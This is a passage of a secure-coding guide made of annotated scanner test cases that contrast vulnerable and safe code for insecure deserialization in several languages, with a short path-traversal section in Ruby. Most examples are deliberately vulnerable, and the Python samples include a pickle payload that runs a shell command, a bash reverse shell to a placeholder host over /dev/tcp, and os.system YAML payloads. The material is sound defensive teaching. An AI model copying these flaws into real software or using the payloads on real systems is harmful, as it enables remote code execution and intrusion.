- [Newtonsoft TypeNameHandling Remarks](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm#remarks)

---

**Incorrect: using FsPickler with default configuration**

```csharp
using MBrace.FsPickler.Json;

namespace InsecureDeserialization
{
    public class InsecureFsPicklerDeserialization
    {
        public void FsPicklerDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-fspickler-deserialization
                var fsPickler = FsPickler.CreateJsonSerializer();
                MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(json));
                fsPickler.Deserialize<object>(memoryStream);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [FsPickler Disable Subtype Resolution](https://mbraceproject.github.io/FsPickler/tutorial.html#Disabling-Subtype-Resolution)

---

**Incorrect: using NetDataContractSerializer which is inherently insecure**

```csharp
using System.Runtime.Serialization;

namespace InsecureDeserialization
{
    public class InsecureNetDataContractDeserialization
    {
        public void NetDataContractDeserialization(string json)
        {
            try
            {
                MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));

                // ruleid: insecure-netdatacontract-deserialization
                NetDataContractSerializer netDataContractSerializer = new NetDataContractSerializer();
                object obj = netDataContractSerializer.Deserialize(ms);
                Console.WriteLine(obj);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft NetDataContractSerializer Security](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8#security)

---

**Incorrect: using SoapFormatter which is inherently insecure**

```csharp
using System.Runtime.Serialization.Formatters.Soap;

namespace InsecureDeserialization
{
    public class InsecureSoapFormatterDeserialization
    {
        public void SoapFormatterDeserialization(string json)
        {
            try
            {
                MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));

                // ruleid: insecure-soapformatter-deserialization
                SoapFormatter soapFormatter = new SoapFormatter();
                object obj = soapFormatter.Deserialize(ms);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft SoapFormatter Remarks](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8#remarks)

---

**Incorrect: using TypeFilterLevel.Full in .NET Remoting**

```csharp
namespace InsecureDeserialization
{
    public class InsecureTypeFilterLevel
    {
        public void SetTFL(string json)
        {
            BinaryServerFormatterSinkProvider serverProvider = new BinaryServerFormatterSinkProvider(formatterProps, null);

            // ruleid: insecure-typefilterlevel-full
            serverProvider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;

            // ruleid: insecure-typefilterlevel-full
            var provider = new BinaryServerFormatterSinkProvider { TypeFilterLevel = TypeFilterLevel.Full };

            var dict = new Hashtable();
            dict["typeFilterLevel"] = "Full";
            // ruleid: insecure-typefilterlevel-full
            BinaryServerFormatterSinkProvider serverProvider2 = new BinaryServerFormatterSinkProvider(dict, null);
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft TypeFilterLevel Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-6.0)

- [Synacktiv ICS Miami Exploit](https://www.synacktiv.com/en/publications/izi-izi-pwn2own-ics-miami.html)

---

**Incorrect: using FastJSON with BadListTypeChecking disabled**

```csharp
using fastJSON;

namespace InsecureDeserialization
{
    public class InsecureFastJSONDeserialization
    {
        public void FastJSONDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-fastjson-deserialization
                var obj = JSON.ToObject(json, new JSONParameters { BadListTypeChecking = false });
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [FastJSON Security Warning](https://github.com/mgholam/fastJSON#security-warning-update)

---

**Incorrect: using SimpleTypeResolver which is inherently insecure**

```csharp
using System.Web.Script.Serialization;

namespace InsecureDeserialization
{
    public class InsecureJavascriptSerializerDeserialization
    {
        public void JavascriptSerializerDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-javascriptserializer-deserialization
                var serializer = new JavaScriptSerializer(new SimpleTypeResolver());
                serializer.DeserializeObject(json);

                var resolver = new SimpleTypeResolver()
                // ruleid: insecure-javascriptserializer-deserialization
                var serializer2 = new JavaScriptSerializer(resolver);
                serializer2.DeserializeObject(json);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft SimpleTypeResolver Remarks](https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.simpletyperesolver?view=netframework-4.8#remarks)

---

**Incorrect: implementing custom DataContractResolver**

```csharp
namespace DCR
{
    // ruleid: data-contract-resolver
    class MyDCR : DataContractResolver
    {
        public void ResolveDataContract()
        {

        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Microsoft BinaryFormatter Security Guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)

---

**Incorrect: unserializing user-controlled data**

```php
<?php

$data = $_GET["data"];
// ruleid: unserialize-use
$object = unserialize($data);
```

**Correct: use hardcoded or validated data**

```php
<?php

// ok: unserialize-use
$object2 = unserialize('O:1:"a":1:{s:5:"value";s:3:"100";}');
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [PHP unserialize() Documentation](https://www.php.net/manual/en/function.unserialize.php)

- [OWASP Insecure Deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization.html)

---

**Incorrect: extracting user-controlled arrays**

```php
<?php

$bad = $_GET['some_param'];
// ruleid:extract-user-data
extract($bad, EXTR_PREFIX_SAME, "wddx");
echo "$color, $size, $shape, $wddx_size\n";

$bad2 = $_FILES["/some/bad/path"];
// ruleid:extract-user-data
extract($bad2, EXTR_PREFIX_SAME, "wddx");
```

**Correct: use EXTR_SKIP or trusted data**

```php
<?php

/* Suppose that $var_array is an array returned from
   wddx_deserialize */

$size = "large";
$var_array = array("color" => "blue",
                   "size"  => "medium",
                   "shape" => "sphere");
// ok: extract-user-data
extract($var_array, EXTR_PREFIX_SAME, "wddx");

// ok: extract-user-data
$ok = $_FILES["/some/bad/path"];
extract($ok, EXTR_SKIP, "wddx");
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [PHP extract() Notes](https://www.php.net/manual/en/function.extract.php#refsect1-function.extract-notes)

---

**Incorrect: using unserialize/maybe_unserialize with untrusted data**

```php
<?php

// ruleid: wp-php-object-injection-audit
$content = unserialize($POST['post_content']);

// ruleid: wp-php-object-injection-audit
$rank_math=unserialize($rank_value);

// ruleid: wp-php-object-injection-audit
$import_options = maybe_unserialize($import->options);

// ruleid: wp-php-object-injection-audit
$data = unserialize(base64_decode($var));
```

**Correct: use serialize for output, not unserialize for input**

```php
<?php

// ok: wp-php-object-injection-audit
$data = serialize(base64_encode($var))
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [WPScan Security Testing Cheat Sheet](https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#php-object-injection)

- [OWASP PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

---

**Incorrect: using Object type in RMI interfaces**

```java
// cf. https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/

package de.mogwailabs.BSidesRMIService;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import java.rmi.Remote;
import java.rmi.RemoteException;

// ruleid:server-dangerous-object-deserialization
public interface IBSidesService extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(Object attende) throws RemoteException;
}

// ruleid:server-dangerous-object-deserialization
public interface IBSidesService extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(StringBuilder attende) throws RemoteException;
}
```

**Correct: use primitive types or Integer**

```java
// ok:server-dangerous-object-deserialization
public interface IBSidesServiceOK extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(int attende) throws RemoteException;
}

// ok:server-dangerous-object-deserialization
public interface IBSidesServiceOK extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(Integer attende) throws RemoteException;
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Attacking Java RMI Services After JEP 290](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)

- [HackTricks Java RMI Pentesting](https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi)

---

**Incorrect: using non-primitive classes in RMI interfaces**

```java
// cf. https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/

package de.mogwailabs.BSidesRMIService;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import java.rmi.Remote;
import java.rmi.RemoteException;

// ruleid:server-dangerous-class-deserialization
public interface IBSidesService extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkname) throws RemoteException;
   void poke(Attendee attende) throws RemoteException;
}

public class Attendee {
    public int id;
    public String handle;
}
```

**Correct: use primitive types**

```java
// ok:server-dangerous-class-deserialization
public interface IBSidesServiceOK extends Remote {
   boolean registerTicket(long ticketID) throws RemoteException;
   void vistTalk(long talkID) throws RemoteException;
   void poke(int attende) throws RemoteException;
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Attacking Java RMI Services After JEP 290](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)

---

**Incorrect (calling getObject() on JMS ObjectMessage):**

```java
package com.rands.couponproject.ejb;

import java.util.Date;

import javax.ejb.ActivationConfigProperty;
import javax.ejb.EJB;
import javax.ejb.MessageDriven;
import javax.jms.JMSException;
import javax.jms.Message;
import javax.jms.MessageListener;
import javax.jms.ObjectMessage;
import javax.jms.TextMessage;

@MessageDriven(activationConfig = {
        @ActivationConfigProperty(
        propertyName = "destinationType", propertyValue = "javax.jms.Queue"),
        @ActivationConfigProperty(
        propertyName = "destination", propertyValue = "java:/jms/queue/MyQueue")
        })
public class IncomeConsumerBean implements MessageListener {

    public void onMessage(Message message) {
        try {
            if (message instanceof ObjectMessage) {
                ObjectMessage msg = (ObjectMessage) message;

                // ruleid: insecure-jms-deserialization
                Object o = msg.getObject(); // variant 1 : calling getObject method directly on an ObjectMessage object

                // ruleid: insecure-jms-deserialization
                Income income = (Income) msg.getObject(); // variant 2 : calling getObject method and casting to a custom class
            }

        } catch (JMSException e) {
            // handle exception
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [BlackHat: Pwning Your Java Messaging With Deserialization Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities-wp.pdf)

---

**Incorrect (using Yaml() without SafeConstructor):**

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class SnakeYamlTestCase {
    public void unsafeLoad(String toLoad) {
        // ruleid:use-snakeyaml-constructor
        Yaml yaml = new Yaml();
        yaml.load(toLoad);
    }
}
```

**Correct: use SafeConstructor or custom Constructor**

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class SnakeYamlTestCase {
    public void safeConstructorLoad(String toLoad) {
        // ok:use-snakeyaml-constructor
        Yaml yaml = new Yaml(new SafeConstructor());
        yaml.load(toLoad);
    }

    public void customConstructorLoad(String toLoad, Class goodClass) {
        // ok:use-snakeyaml-constructor
        Yaml yaml = new Yaml(new Constructor(goodClass));
        yaml.load(toLoad);
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [SnakeYAML Deserialization Vulnerability](https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/#snakeyaml-deserialization-vulnerability)

---

**Incorrect: using enableDefaultTyping with Object fields**

```java
private class Car {
    private Fake variable;

    @JsonTypeInfo(use = Id.CLASS)
    private Object color;
    private String type;

    public static void main(String[] args) throws JsonGenerationException, JsonMappingException, IOException {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();

        try {
            // ruleid: jackson-unsafe-deserialization
            Car car = objectMapper.readValue(Paths.get("target/payload.json").toFile(), Car.class);
            System.out.println((car.getColor()));
        } catch (Exception e) {
            System.out.println("Exception raised:" + e.getMessage());
        }

    }
}

// Additional class to test rule when ObjectMapper is created in a different method
@RestController
public class MyController {
    private ObjectMapper objectMapper;

    @PostConstruct
    public void initialize() {
        objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
    }

    @RequestMapping(path = "/vulnerable", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)
    public GenericUser vulnerable(@CookieValue(name = "token", required = false) String token) {
        byte[] decoded = Base64.getDecoder().decode(token);
        String decodedString = new String(decoded);
        // ruleid: jackson-unsafe-deserialization
        Car obj = objectMapper.readValue(
                decodedString,
                Car.class);
        return obj;
    }
}
```

**Correct: avoid enableDefaultTyping and Object fields**

```java
public static void anotherMain2(String[] args) throws JsonGenerationException, JsonMappingException, IOException {
    ObjectMapper objectMapper = new ObjectMapper();

    try {
        // ok: jackson-unsafe-deserialization
        Car car = objectMapper.readValue(Paths.get("target/payload.json").toFile(), Another.class);
        System.out.println((car.getColor()));
    } catch (Exception e) {
        System.out.println("Exception raised:" + e.getMessage());
    }

}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Understanding Insecure Implementation of Jackson Deserialization](https://swapneildash.medium.com/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038)

- [On Jackson CVEs - Don't Panic](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)

---

**Incorrect: using ObjectInputStream to deserialize objects**

```java
package deserialize;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.lang.ClassNotFoundException;

import com.biz.org.UserData;

public class Cls
{
    public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException {
        // ruleid:object-deserialization
        ObjectInputStream in = new ObjectInputStream(receivedFile);
        return (UserData) in.readObject();
    }

    public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException {
        // ruleid:object-deserialization
        try (ObjectInputStream in = new ObjectInputStream(receivedFile)) {
            return (UserData) in.readObject();
        } catch (IOException e) {
            throw e;
        }
    }
}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [OWASP Deserialization of Untrusted Data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)

- [Oracle Java Security Guidelines](https://www.oracle.com/java/technologies/javase/seccodeguide.html#8)

---

**Incorrect: using wildcard @Consumes or missing @Consumes**

```java
package unsafe.jaxrs;

import java.util.*;
import javax.ws.rs.*;
import javax.ws.rs.core.*;

@Path("/")
public class PoC_resource {
  @POST
  @Path("/concat")
  @Produces(MediaType.APPLICATION_JSON)
  // ruleid: insecure-resteasy-deserialization
  @Consumes({ "*/*" })
  public Map<String, String> doConcat(Pair pair) {
    HashMap<String, String> result = new HashMap<String, String>();
    result.put("Result", pair.getP1() + pair.getP2());

    return result;
  }

  // ruleid:default-resteasy-provider-abuse
  @POST
  @Path("/vulnerable")
  @Produces(MediaType.APPLICATION_JSON)
  public Map<String, String> doConcat(Pair pair) {
    HashMap<String, String> result = new HashMap<String, String>();
    result.put("Result", pair.getP1() + pair.getP2());

    return result;
  }
}
```

**Correct: use specific MediaType in @Consumes**

```java
package unsafe.jaxrs;

import java.util.*;
import javax.ws.rs.*;
import javax.ws.rs.core.*;

@Path("/")
public class PoC_resource {
  @POST
  @Path("/count")
  @Produces(MediaType.APPLICATION_JSON)
  // ok: insecure-resteasy-deserialization
  @Consumes(MediaType.APPLICATION_JSON)
  public Map<String, Integer> doCount(ArrayList<Object> elements) {
    HashMap<String, Integer> result = new HashMap<String, Integer>();
    result.put("Result", elements.size());

    return result;
  }

  // ok: default-resteasy-provider-abuse
  @GET
  @Path("/tenantmode")
  @Produces(MediaType.TEXT_PLAIN)
  public String getTenantMode() {
    return kubernetesService.getMessage();
  }

}

@Path("/")
@Consumes(MediaType.APPLICATION_JSON)
@Produces(MediaType.APPLICATION_JSON)
public class PoC_resource {

  // ok: default-resteasy-provider-abuse
  @POST
  @Path("/concat")
  public Map<String, String> doConcat(Pair pair) {
    HashMap<String, String> result = new HashMap<String, String>();
    result.put("Result", pair.getP1() + pair.getP2());
    return result;
  }

}
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Red Hat: How to Avoid Insecure Deserialization](https://access.redhat.com/blogs/766093/posts/3162112)

---

**Incorrect: using pickle/dill/shelve/yaml with request data**

```python
from django.http import HttpResponse
import datetime

def current_datetime(request):
    user_obj = b64decode(request.cookies.get('uuid'))
    now = datetime.datetime.now()
    html = "<html><body>It is now %s.</body></html>" % now

    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    now = datetime.datetime.now()
    html = "<html><body>It is now %s.</body></html>" % now

    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(b64decode(user_obj)))

def current_datetime(request):
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(b64decode(request.cookies.get('uuid'))))

def current_datetime(request):
    user_obj = b64decode(request.cookies.get('uuid'))
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(_pickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(cPickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(dill.loads(b64decode(user_obj)))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(shelve.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(yaml.load(b64decode(user_obj)))
```

**Correct: use safe data sources**

```python
from django.http import HttpResponse
import datetime

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    now = datetime.datetime.now()
    html = "<html><body>It is now %s.</body></html>" % now

    # ok:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(b64decode(html)))
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

---

**Incorrect: using pickle-based libraries**

```python
# Import dependencies
import os
import _pickle

# Attacker prepares exploit that application will insecurely deserialize
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("whoami",))


# Attacker serializes the exploit
def serialize_exploit():
    # ruleid: avoid-pickle
    shellcode = _pickle.dumps(Exploit())
    return shellcode


# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization(exploit_code):
    # ruleid: avoid-pickle
    _pickle.loads(exploit_code)


# Application insecurely deserializes the attacker's serialized data
def insecure_deserialization_2(exploit_code):
    import _pickle as adaasfa

    # ruleid: avoid-pickle
    adaasfa.loads(exploit_code)


import cPickle
import socket


class Shell_code(object):
    def __reduce__(self):
        return (
            os.system,
            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
        )


# ruleid: avoid-cPickle
shell = cPickle.dumps(Shell_code())

import dill

# ruleid: avoid-dill
shell = dill.dumps(Shell_code())

import shelve

# ruleid: avoid-shelve
myShelve = shelve.open(Shell_code())
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

---

**Incorrect: using unsafe YAML loaders**

```python
import yaml


#ruleid:avoid-pyyaml-load
yaml.unsafe_load("!!python/object/new:os.system [echo EXPLOIT!]")

def thing(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.unsafe_load("!!python/object/new:os.system [echo EXPLOIT!]", **kwargs)

def other_thing(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.Loader, **kwargs)

def other_thing_two(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.UnsafeLoader, **kwargs)

def other_thing_three(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.CLoader, **kwargs)

def other_thing_four(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load_all("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.Loader, **kwargs)

def other_thing_five(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load_all("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.UnsafeLoader, **kwargs)

def other_thing_six(**kwargs):
    #ruleid:avoid-pyyaml-load
    yaml.load_all("!!python/object/new:os.system [echo EXPLOIT!]", Loader=yaml.CLoader, **kwargs)
```

**Correct: use SafeLoader or CSafeLoader**

```python
import yaml

def this_is_ok(stream):
    #ok:avoid-pyyaml-load
    return yaml.load(stream, Loader=yaml.CSafeLoader)

def this_is_also_ok(stream):
    #ok:avoid-pyyaml-load
    return yaml.load(stream, Loader=yaml.SafeLoader)

def this_is_additionally_ok(stream):
    #ok:avoid-pyyaml-load
    return yaml.load_all(stream, Loader=yaml.CSafeLoader)

def this_is_ok_too(stream):
    #ok:avoid-pyyaml-load
    return yaml.load_all(stream, Loader=yaml.SafeLoader)

def this_is_ok_as_well(stream):
    #ok:avoid-pyyaml-load
    return yaml.load(stream, Loader=yaml.BaseLoader)

def this_is_ok_too_two(stream):
    #ok:avoid-pyyaml-load
    return yaml.load_all(stream, Loader=yaml.BaseLoader)

def check_ruamel_yaml():
    from ruamel.yaml import YAML
    yaml = YAML(typ="rt")
    # ok:avoid-pyyaml-load
    yaml.load("thing.yaml")
    # ok:avoid-pyyaml-load
    yaml.load_all("thing.yaml")
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [PyYAML yaml.load() Deprecation](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation)

- [CVE-2017-18342](https://nvd.nist.gov/vuln/detail/CVE-2017-18342)

---

**Incorrect: using unsafe typ parameter**

```python
from ruamel.yaml import YAML

#ruleid:avoid-unsafe-ruamel
y3 = YAML(typ='unsafe')

#ruleid:avoid-unsafe-ruamel
y4 = YAML(typ='base')
```

**Correct: use default 'rt' or 'safe' typ**

```python
from ruamel.yaml import YAML

#ok:avoid-unsafe-ruamel
y1 = YAML()  # default is 'rt'

#ok:avoid-unsafe-ruamel
y2 = YAML(typ='rt')

#ok:avoid-unsafe-ruamel
y3 = YAML(typ='safe')
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [ruamel.yaml Basic Use](https://yaml.readthedocs.io/en/latest/basicuse.html?highlight=typ)

---

**Incorrect: using jsonpickle.decode with user input**

```python
import jsonpickle

def run_payload(payload: str) -> None:
    # ruleid: avoid-jsonpickle
    obj = jsonpickle.decode(payload)
```

**Correct: use hardcoded strings**

```python
import jsonpickle

def ok():
    # ok: avoid-jsonpickle
    obj = jsonpickle.decode('foobar')
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [jsonpickle GitHub](https://github.com/jsonpickle/jsonpickle#jsonpickle)

- [jsonpickle Exploit](https://www.exploit-db.com/exploits/49585)

---

**Incorrect: using marshal.dumps/loads**

```python
import marshal

fin = open('index.mar')
for line in fin:
    # ruleid: marshal-usage
    marshal.dumps(line)
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Python marshal Security Warning](https://docs.python.org/3/library/marshal.html?highlight=security)

---

**Incorrect (using Connection.recv() without authentication):**

```python
import multiprocessing
import multiprocessing.connection


rx = multiprocessing.connection.Client(('localhost', 12345)).recv()

# ruleid: multiprocessing-recv
connection = multiprocessing.connection.Client(
    ('localhost', 12345),
)

output = {}
connection.send(output)

# toodoruleid:multiprocessing.recv
rx = connection.recv()
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Python multiprocessing Connection Security](https://docs.python.org/3/library/multiprocessing.html?highlight=security#multiprocessing.connection.Connection)

---

**Incorrect: using pickle in Flask routes**

```python
# flask_app.py
import os
import pickle
from uuid import uuid1
from flask import Flask, make_response, request
from base64 import b64encode, b64decode

class UserID:
    def __init__(self, uuid=None):
        self.uuid = str(uuid1())
    def __str__(self):
        return self.uuid

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    user_obj = request.cookies.get('uuid')
    if user_obj == None:
        msg = "Seems like you didn't have a cookie. No worries! I'll set one now!"
        response = make_response(msg)
        user_obj = UserID()
        # ruleid:insecure-deserialization
        response.set_cookie('uuid', b64encode(pickle.dumps(user_obj)))
        return response
    else:
        # ruleid:insecure-deserialization
        return "Hey there! {}!".format(pickle.loads(b64decode(user_obj)))
```

**Correct: load from trusted file sources**

```python
@app.route("/ok")
def ok():
    # ok:insecure-deserialization
    novellist = pickle.load(open('./novel/list.dat', "rb"))
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

---

**Incorrect: deserializing Lambda event data**

```python
import _pickle
import cPickle
from dill import loads
import shelve


def lambda_handler(event, context):

  # ruleid: tainted-pickle-deserialization
  _pickle.load(event['exploit_code'])

  # ruleid: tainted-pickle-deserialization
  obj = cPickle.loads(f"foobar{event['exploit_code']}")

  # ruleid: tainted-pickle-deserialization
  loads(event['exploit_code'])(123)

  # ruleid: tainted-pickle-deserialization
  with shelve.open(f"/tmp/path/{event['object_path']}") as db:
    db['eggs'] = 'eggs'
```

**Correct: use hardcoded or safe data**

```python
def lambda_handler(event, context):

  # ok: tainted-pickle-deserialization
  _pickle.loads('hardcoded code')

  # ok: tainted-pickle-deserialization
  code = '/file/path'
  cPickle.load(code)

  # ok: tainted-pickle-deserialization
  name = 'foobar'
  shelve.open(f"/tmp/path/{name}")
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Python pickle Documentation](https://docs.python.org/3/library/pickle.html)

- [Exploiting Python Pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

---

**Incorrect: using dynamic ClientTrace**

```go
package uhoh

import (
	"context"
	"net"
	"net/http"
	"net/http/httptrace"
)

func WithTrace(req *http.Request, trace *httptrace.ClientTrace) *http.Request {
    // ruleid: dynamic-httptrace-clienttrace
	return req.WithContext(httptrace.WithClientTrace(req.Context(), trace))
}
```

**References:**

- CWE-913: Improper Control of Dynamically-Managed Code Resources

- [GitHub Issue: Dynamic ClientTrace](https://github.com/returntocorp/semgrep-rules/issues/518)

---

**Incorrect: using Marshal.input_value**

```ocaml
(* ruleid:ocamllint-marshal *)
let d = input_value stdin in
  Printf.printf "%d\n" (Buffer.length d)
```

**References:**

- CWE-502: Deserialization of Untrusted Data

- [Secure OCaml Sandbox](https://eternal.red/2021/secure-ocaml-sandbox/)

---

1. **Never deserialize untrusted data** - Treat all external data as potentially malicious

2. **Use JSON for data interchange** - JSON only returns primitive types (strings, arrays, objects, numbers, null)

3. **Implement integrity checks** - Use HMACs to sign serialized data to detect tampering

4. **Use allowlists for deserialization** - Only allow specific, known-safe classes to be deserialized

5. **Avoid native serialization formats** - pickle, Marshal, ObjectInputStream, BinaryFormatter are all dangerous

6. **Use safe YAML loaders** - Always use SafeLoader or CSafeLoader with PyYAML

7. **Disable type resolution** - For JSON libraries, disable TypeNameHandling or equivalent features

8. **Monitor and log deserialization** - Alert on unexpected deserialization attempts

9. **Keep libraries updated** - Apply security patches promptly

10. **Consider alternatives** - Protocol Buffers, FlatBuffers, or JSON Schema for structured data

**References:**

- CWE-502: Deserialization of Untrusted Data

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

- [OWASP Top 10 A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)

### 0.14 Prevent Path Traversal

**Impact: CRITICAL (Arbitrary file access, information disclosure, file manipulation)**

Path traversal occurs when user input is used to construct file paths without proper validation, allowing attackers to access files outside intended directories using sequences like "../". This can lead to sensitive data exposure, arbitrary file reads/writes, and system compromise.

---

**Incorrect: vulnerable to path traversal**

```ruby
def test_send_file
    # ruleid: check-send-file
    send_file params[:file]
end

def test_send_file2
    # ruleid: check-send-file
    send_file cookies[:something]
end

def test_send_file8
    # ruleid: check-send-file
    send_file request.env[:badheader]
end
```

**Correct: safe**

```ruby
def test_send_file_ok
    # ok: check-send-file
    send_file "some_safe_file.txt"
end

def test_send_file5
    # ok: check-send-file
    send_file cookies.encrypted[:something]
end
```

**References:**

- CWE-73: External Control of File Name or Path

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Incorrect: vulnerable to path traversal**

```ruby
def test_dynamic_render
    page = params[:page]
    #ruleid: check-render-local-file-include
    render :file => "/some/path/#{page}"
end

def test_render_with_modern_param
    page = params[:page]
    #ruleid: check-render-local-file-include
    render file: "/some/path/#{page}"
end

def test_render_with_first_positional_argument
    page = params[:page]
    #ruleid: check-render-local-file-include
    render page
end
```

**Correct: path validated**

```ruby
def test_render_with_modern_param
    page = params[:page]
    #ok: check-render-local-file-include
    render file: File.basename("/some/path/#{page}")
